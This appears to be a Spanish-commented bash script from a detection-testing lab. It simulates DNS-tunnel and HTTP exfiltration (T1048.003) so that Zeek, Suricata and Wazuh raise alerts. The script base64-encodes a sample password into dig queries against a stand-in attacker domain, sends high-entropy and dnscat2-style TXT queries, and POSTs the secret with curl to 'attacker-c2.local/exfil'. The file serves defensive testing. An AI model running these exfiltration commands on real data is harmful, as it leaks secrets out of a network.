#!/bin/bash
# ============================================================================
# Escenario S10: Exfiltración por DNS Tunnel (T1048.003)
# ============================================================================
# Herramientas: iodine, dnscat2
# Target: DNS exfil detection via Zeek
# ============================================================================

set -e
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
EVIDENCE_DIR="$SCRIPT_DIR/evidencia"
mkdir -p "$EVIDENCE_DIR"

# DNS exfil patterns will be generated against arbitrary attacker-controlled domain
EXFIL_DOMAIN="attacker-data-leak.sin-exfil.xyz"
TIMESTAMP=$(date -u +"%Y%m%dT%H%M%SZ")

echo "=========================================="
echo "S10: DNS Tunnel Exfiltration (T1048.003)"
echo "Timestamp: $TIMESTAMP"
echo "=========================================="

echo "$TIMESTAMP" > "$EVIDENCE_DIR/start_time.txt"

# 1. DNS exfiltration via TXT queries (simulated - we send data in subdomain)
echo "[*] Fase 1: DNS exfiltration via TXT queries"
# Codificar un payload como subdominio (estilo iodine)
SECRET_DATA="admin_password=Bckp_2024_F1n4nc"
ENCODED=$(echo -n "$SECRET_DATA" | base64)
# dns lookup will be detected by Zeek/Suricata even if domain doesn't exist
for i in {1..5}; do
    SUB=$(echo "$ENCODED" | head -c $((i*10)) | tail -c 10).$EXFIL_DOMAIN
    dig +short TXT "$SUB" @8.8.8.8 2>/dev/null | tee -a "$EVIDENCE_DIR/dns_exfil.log"
    sleep 0.5
done

# 2. DNS exfiltration via long subdomain (high entropy detection)
echo "[*] Fase 2: High-entropy subdomain (Zeek should detect)"
RANDOM_DATA=$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 60)
for i in {1..3}; do
    FULL_DOMAIN="${RANDOM_DATA}.${EXFIL_DOMAIN}"
    dig +short "$FULL_DOMAIN" @8.8.8.8 2>/dev/null | tee -a "$EVIDENCE_DIR/dns_exfil.log"
    sleep 0.3
done

# 3. dnscat2 style - many short TXT queries
echo "[*] Fase 3: dnscat2-style traffic"
for chunk in {1..10}; do
    PAYLOAD="chunk${chunk}_$(openssl rand -hex 8)"
    dig +short TXT "${PAYLOAD}.${EXFIL_DOMAIN}" @8.8.8.8 2>/dev/null | tee -a "$EVIDENCE_DIR/dns_exfil.log"
    sleep 0.1
done

# 4. HTTP-based exfil to attacker (control)
echo "[*] Fase 4: HTTP POST exfiltration"
curl -s -X POST "http://attacker-c2.local/exfil" \
    -H "Content-Type: application/octet-stream" \
    --data-binary "$SECRET_DATA" \
    -o "$EVIDENCE_DIR/http_exfil.log" 2>&1 || true

END_TIME=$(date -u +"%Y%m%dT%H%M%SZ")
echo "$END_TIME" > "$EVIDENCE_DIR/end_time.txt"

cat > "$EVIDENCE_DIR/resultados.json" <<EOF
{
  "scenario": "S10-exfiltracion-dns",
  "technique_id": "T1048.003",
  "technique_name": "Exfiltration Over Unencrypted Non-C2 Protocol",
  "tactic": "Exfiltration",
  "timestamp_start": "$TIMESTAMP",
  "timestamp_end": "$END_TIME",
  "tools_used": ["dig", "curl", "openssl"],
  "protocols": ["DNS", "HTTP"],
  "evidence_files": [
    "dns_exfil.log",
    "http_exfil.log"
  ],
  "expected_detection": [
    "Zeek dns.log (high entropy subdomains)",
    "Suricata ET DNS over HTTPS / TXT anomalies",
    "Wazuh rule 100270 (DNS tunneling)"
  ],
  "iso27035_phase": "Detection and Reporting (Phase 2)"
}
EOF

echo "[OK] Escenario S10 ejecutado. Tráfico DNS anómalo generado."
